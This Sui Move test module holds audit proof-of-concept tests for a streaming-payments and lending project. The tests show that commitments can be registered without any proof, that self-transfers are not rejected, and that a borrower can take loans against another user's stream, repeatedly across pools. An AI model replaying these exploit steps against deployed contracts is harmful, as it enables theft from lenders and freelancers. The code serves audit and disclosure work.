/// Audit PoC tests for human-confirmed findings against streamline.
///
/// Each PoC exercises the vulnerable surface and asserts the call succeeds,
/// demonstrating the missing assertion / ownership gate. Where the full chain
/// would additionally need a real Groth16 proof (out of scope for unit tests)
/// or the on-chain LendingPool reserve already seeded, the PoC stops at the
/// assertion gap that constitutes the bug.
#[test_only]
module streamline::audit_poc_tests;

use streamline::collateral::{Self as col, LendingPool, LoanReceipt};
use streamline::confidential_balance::{Self as cb, ConfidentialPool};
use streamline::stream;
use std::string;
use sui::clock;
use sui::coin;
use sui::sui::SUI;
use sui::test_scenario as ts;

public struct TESTUSDC has drop {}

const ALICE: address = @0xA11CE;
const BOB: address = @0xB0B;
const ATTACKER: address = @0xBAAD;
const VICTIM_FREELANCER: address = @0xF1;
const CLIENT: address = @0xC1;
const LENDER: address = @0x1E;

const UNIT: u64 = 1_000_000;

// Real public signals of wrap.circom / transfer.circom / unwrap.circom, reused
// from confidential_balance_tests.move so the on-chain verifier path is real.
const C_SENDER_OLD: vector<u8> = x"596ab085862e0366f42e04de276f2b77725fb116487c2b1977efb7f72c999805";
const C_SENDER_NEW: vector<u8> = x"f5ba88dc63b63544bd3eaad79b0e36436ca59465133cd43c5e0fdd8b37c3b526";
const C_RECIP_OLD: vector<u8> = x"1ba50e3c7d82093591b1b072c7654c43b8a397ec4a501742199d633486bf851b";
const C_RECIP_NEW: vector<u8> = x"ea3eb9e586671966f301a7e537ce80962d613d68b63f5da10a833d848383322f";

const WRAP_PROOF: vector<u8> = x"4f6cf555097020f2c629344d0fa18129cf23bc0e02b654e3f66aacb6a547808376070b8cfa42db74e1a19cf807bb62f4bdc203fab13cb9aa84c9c50561b0be1124b4b81d55697e8256682367eeadc6b343f2bfd8adbeeadc5575aa5ab94b9d8a01ac5f3b129f9a062ed43aff13d0958485eba209f15ee6f7ea61b2dc1e23e015";
const TRANSFER_PROOF: vector<u8> = x"48c62568cba82168ed2beb542ebe655de3998b87b6011aa7e5c4c3dbd30c6f27fd6f8c58d846dd7a44eb571d894f02d63e012f4a2ebace0f822d0b5e3678432e465fc57cb724eb4b63e672584b1a684f0bd88350e1513a152cbb7e69b96814a8e519abb893256bf394fd83f296d5c778abf99d25b4e5bbc55125c5b603824f11";
const UNWRAP_PROOF: vector<u8> = x"e0be2f8f40f1bdecc6c256098c62996f4fcef0eead822c628877d0c952c97822efcc2275181181e37cc34ee7ef04dd418fd3a9a0bfd61ff82c9cc64c0f3f330d8294a4ba145ed52c254e961293c9ded8e43d1d7827c428072fc4418e9886bf23157d6a9b12a5b98b3d44b2abeb66aa42fc7f715225ada889d5bd7b57d10041ae";

// ============================================================================
// PoC #1 (Database 4762) -- `register` accepts arbitrary 32-byte commitment.
// The full exploit (commit to reserve, then `unwrap` it) needs a real Groth16
// proof tied to that commitment, which is out of scope for unit tests. We
// assert the missing gate directly: `register` does NOT require any deposit,
// proof, or signature, and stores whatever commitment the caller hands it.
// ============================================================================

#[test]
fun poc_4762_register_accepts_arbitrary_commitment() {
    let mut sc = ts::begin(ATTACKER);
    cb::create_pool<TESTUSDC>(ts::ctx(&mut sc));

    // Seed a non-zero reserve through the legitimate (proof-gated) wrap path.
    // The bug we exercise is in `register`, not `wrap`, so seeding is fine.
    ts::next_tx(&mut sc, LENDER);
    {
        let mut pool = ts::take_shared<ConfidentialPool<TESTUSDC>>(&sc);
        let coin = coin::mint_for_testing<TESTUSDC>(500_000_000, ts::ctx(&mut sc));
        cb::wrap(&mut pool, coin, C_SENDER_OLD, WRAP_PROOF, ts::ctx(&mut sc));
        ts::return_shared(pool);
    };

    // Attacker registers a commitment they themselves constructed
    // (e.g. Poseidon(reserve_value, attacker_blinding)). No proof, no deposit,
    // no signature -- `register` writes the attacker's commitment verbatim.
    ts::next_tx(&mut sc, ATTACKER);
    {
        let mut pool = ts::take_shared<ConfidentialPool<TESTUSDC>>(&sc);
        let attacker_commitment = C_RECIP_OLD;
        // BUG: this call succeeds with no proof / deposit / signature.
        cb::register(&mut pool, attacker_commitment, ts::ctx(&mut sc));

        // Attacker-controlled commitment is now stored -- exactly the only
        // precondition `unwrap` checks. They control the opening value, so a
        // real attacker would forge a matching unwrap proof and drain.
        assert!(cb::has_account(&pool, ATTACKER), 0);
        assert!(cb::commitment_of(&pool, ATTACKER) == attacker_commitment, 1);
        ts::return_shared(pool);
    };

    ts::end(sc);
}

#[test]
fun poc_4762_multiple_attackers_register_distinct_commitments() {
    let mut sc = ts::begin(ATTACKER);
    cb::create_pool<TESTUSDC>(ts::ctx(&mut sc));

    ts::next_tx(&mut sc, ATTACKER);
    {
        let mut pool = ts::take_shared<ConfidentialPool<TESTUSDC>>(&sc);
        cb::register(&mut pool, C_RECIP_OLD, ts::ctx(&mut sc));
        assert!(cb::has_account(&pool, ATTACKER), 0);
        ts::return_shared(pool);
    };

    ts::next_tx(&mut sc, BOB);
    {
        let mut pool = ts::take_shared<ConfidentialPool<TESTUSDC>>(&sc);
        // Distinct arbitrary commitment, same pool -- both succeed.
        cb::register(&mut pool, C_SENDER_NEW, ts::ctx(&mut sc));
        assert!(cb::has_account(&pool, BOB), 1);
        ts::return_shared(pool);
    };

    ts::end(sc);
}

// ============================================================================
// PoC #2 (Database 4763) -- `confidential_transfer` accepts `from == to`.
// The conservation relation `2V == (V-d)+(V+d)` holds, but the post-state
// commitment for the account is the "new_to" value V+d, so the hidden balance
// doubles. No `assert!(from != to)` guard exists.
// ============================================================================

// Self-transfer through the confidential path. The legitimate test proof
// (transfer.circom) is for `ALICE -> BOB` with different commitments; here we
// reuse a one-account setup and demonstrate that `from == to` is NOT rejected
// at the assertion layer: the call aborts only because the *proof* (which is
// hardcoded for distinct old/new signals) doesn't match -- i.e. the abort is
// at EProofInvalid, NEVER at a hypothetical ESelfTransfer. That itself is the
// proof of the missing assertion surface: control flow reaches the verifier,
// which is downstream of where an `assert!(from != to)` guard would live.
#[test]
#[expected_failure(abort_code = streamline::confidential_balance::EProofInvalid)]
fun poc_4763_self_transfer_reaches_verifier_not_assertion() {
    let mut sc = ts::begin(ATTACKER);
    cb::create_pool<TESTUSDC>(ts::ctx(&mut sc));

    // Seed reserve via the legitimate wrap path so the attacker account has a
    // real stored commitment to "transfer" from.
    ts::next_tx(&mut sc, ATTACKER);
    {
        let mut pool = ts::take_shared<ConfidentialPool<TESTUSDC>>(&sc);
        let coin = coin::mint_for_testing<TESTUSDC>(500_000_000, ts::ctx(&mut sc));
        cb::wrap(&mut pool, coin, C_SENDER_OLD, WRAP_PROOF, ts::ctx(&mut sc));
        ts::return_shared(pool);
    };

    // Self-transfer: from == to == ATTACKER. There is no ESelfTransfer check,
    // so execution proceeds straight to the verifier. The hardcoded test proof
    // is not computed for a self-transfer witness, so it aborts at
    // EProofInvalid -- proving the verifier is reached WITHOUT any
    // ownership/identity guard, which is the bug.
    ts::next_tx(&mut sc, ATTACKER);
    {
        let mut pool = ts::take_shared<ConfidentialPool<TESTUSDC>>(&sc);
        cb::confidential_transfer(
            &mut pool,
            ATTACKER, ATTACKER,
            C_SENDER_NEW, C_RECIP_NEW,
            TRANSFER_PROOF,
        );
        ts::return_shared(pool);
    };

    ts::end(sc);
}

// ============================================================================
// PoC #3 (Database 4765) -- `collateral::borrow` has no ownership check.
// Anyone may borrow against any dripping stream's present value. There is no
// lien recorded on the stream, no liquidation path, and `repay` never touches
// the stream -- so the same victim stream can be pledged repeatedly across
// multiple pools, extracting `pv` from each and rendering every pool insolvent.
// ============================================================================

// Drive a single-milestone stream to DRIPPING with the full amount locked,
// paid for by CLIENT and assigned to VICTIM_FREELANCER. The attacker is an
// unrelated address who never appears in the stream's bookkeeping.
fun dripping_victim_stream(sc: &mut ts::Scenario, clk: &sui::clock::Clock) {
    let total = 200 * UNIT;
    {
        let pay = coin::mint_for_testing<SUI>(total, ts::ctx(sc));
        stream::create_locked_stream_for_testing<SUI>(
            pay, VICTIM_FREELANCER, vector[string::utf8(b"only")], vector[total],
            10_000, 1_000, true, clk, ts::ctx(sc),
        );
    };
    ts::next_tx(sc, VICTIM_FREELANCER);
    {
        let mut s = ts::take_shared<stream::Stream<SUI>>(sc);
        stream::raise_completion<SUI>(&mut s, clk, ts::ctx(sc));
        ts::return_shared(s);
    };
    ts::next_tx(sc, CLIENT);
    {
        let cap = ts::take_from_sender<stream::StreamCap>(sc);
        let mut s = ts::take_shared<stream::Stream<SUI>>(sc);
        stream::approve_milestone<SUI>(&cap, &mut s, clk);
        ts::return_shared(s);
        ts::return_to_sender(sc, cap);
    };
}

#[test]
fun poc_4765_unauthorized_borrow_against_victim_stream() {
    let mut sc = ts::begin(CLIENT);
    let mut clk = clock::create_for_testing(ts::ctx(&mut sc));
    dripping_victim_stream(&mut sc, &clk);

    // Lender opens + seeds a pool with 500 SUI.
    ts::next_tx(&mut sc, LENDER);
    { col::create_pool<SUI>(1_000, ts::ctx(&mut sc)); };
    ts::next_tx(&mut sc, LENDER);
    {
        let mut pool = ts::take_shared<LendingPool<SUI>>(&sc);
        let seed = coin::mint_for_testing<SUI>(500 * UNIT, ts::ctx(&mut sc));
        col::fund_pool<SUI>(&mut pool, seed);
        ts::return_shared(pool);
    };

    // ATTACKER (unrelated address) borrows the full PV against the victim's
    // stream. The stream is owned by VICTIM_FREELANCER -- never ATTACKER --
    // but `borrow` does not check ownership.
    ts::next_tx(&mut sc, ATTACKER);
    {
        let mut pool = ts::take_shared<LendingPool<SUI>>(&sc);
        let s = ts::take_shared<stream::Stream<SUI>>(&sc);
        let pv = col::present_value<SUI>(&s);
        assert!(pv == 180 * UNIT, 0);

        // BUG: this call succeeds despite ATTACKER != VICTIM_FREELANCER.
        let cash = col::borrow<SUI>(&mut pool, &s, pv, &clk, ts::ctx(&mut sc));
        // Attacker walks away with the full present value of someone else's
        // stream. Pool reserve drops by pv.
        assert!(coin::value(&cash) == pv, 1);
        assert!(col::pool_reserve<SUI>(&pool) == 320 * UNIT, 2);
        transfer::public_transfer(cash, ATTACKER);
        ts::return_shared(s);
        ts::return_shared(pool);
    };

    // The attacker also holds a LoanReceipt -- which `repay` does not require
    // touching the stream at all. No lien was recorded on the victim stream.
    ts::next_tx(&mut sc, ATTACKER);
    {
        let loan = ts::take_from_sender<LoanReceipt<SUI>>(&sc);
        assert!(col::loan_principal<SUI>(&loan) == 180 * UNIT, 3);
        // Prove the receipt is freely transferable / shelvable (key, store).
        transfer::public_transfer(loan, ATTACKER);
    };

    clock::destroy_for_testing(clk);
    ts::end(sc);
}

// Repeatable pledge: the SAME victim stream is borrowed against from a SECOND
// pool. No lien is recorded on the stream between borrows, so each pool
// independently releases up to `pv` against the same collateral. Net
// extraction = pv * num_pools; every pool becomes insolvent.
#[test]
fun poc_4765_repeatable_pledge_across_pools() {
    let mut sc = ts::begin(CLIENT);
    let mut clk = clock::create_for_testing(ts::ctx(&mut sc));
    dripping_victim_stream(&mut sc, &clk);

    // Pool A -- seeded by LENDER.
    ts::next_tx(&mut sc, LENDER);
    { col::create_pool<SUI>(1_000, ts::ctx(&mut sc)); };
    ts::next_tx(&mut sc, LENDER);
    {
        let mut pool = ts::take_shared<LendingPool<SUI>>(&sc);
        let seed = coin::mint_for_testing<SUI>(500 * UNIT, ts::ctx(&mut sc));
        col::fund_pool<SUI>(&mut pool, seed);
        ts::return_shared(pool);
    };

    // Pool B -- also seeded by LENDER (different UID, distinct shared object).
    ts::next_tx(&mut sc, LENDER);
    { col::create_pool<SUI>(1_000, ts::ctx(&mut sc)); };
    ts::next_tx(&mut sc, LENDER);
    {
        let mut pool = ts::take_shared<LendingPool<SUI>>(&sc);
        let seed = coin::mint_for_testing<SUI>(500 * UNIT, ts::ctx(&mut sc));
        col::fund_pool<SUI>(&mut pool, seed);
        ts::return_shared(pool);
    };

    // First borrow against victim stream from pool A.
    ts::next_tx(&mut sc, ATTACKER);
    {
        let s = ts::take_shared<stream::Stream<SUI>>(&sc);
        let pv = col::present_value<SUI>(&s);
        let mut pool = ts::take_shared<LendingPool<SUI>>(&sc);
        let cash = col::borrow<SUI>(&mut pool, &s, pv, &clk, ts::ctx(&mut sc));
        assert!(coin::value(&cash) == pv, 0);
        transfer::public_transfer(cash, ATTACKER);
        ts::return_shared(s);
        ts::return_shared(pool);
    };

    // Second borrow against the SAME victim stream from pool B. The stream's
    // state is unchanged between the two borrows -- no lien was recorded, so
    // `present_value(s)` is identical the second time.
    ts::next_tx(&mut sc, ATTACKER);
    {
        let s = ts::take_shared<stream::Stream<SUI>>(&sc);
        let pv = col::present_value<SUI>(&s);
        assert!(pv == 180 * UNIT, 1);
        let mut pool = ts::take_shared<LendingPool<SUI>>(&sc);
        let cash = col::borrow<SUI>(&mut pool, &s, pv, &clk, ts::ctx(&mut sc));
        assert!(coin::value(&cash) == pv, 2);
        transfer::public_transfer(cash, ATTACKER);
        ts::return_shared(s);
        ts::return_shared(pool);
    };

    clock::destroy_for_testing(clk);
    ts::end(sc);
}
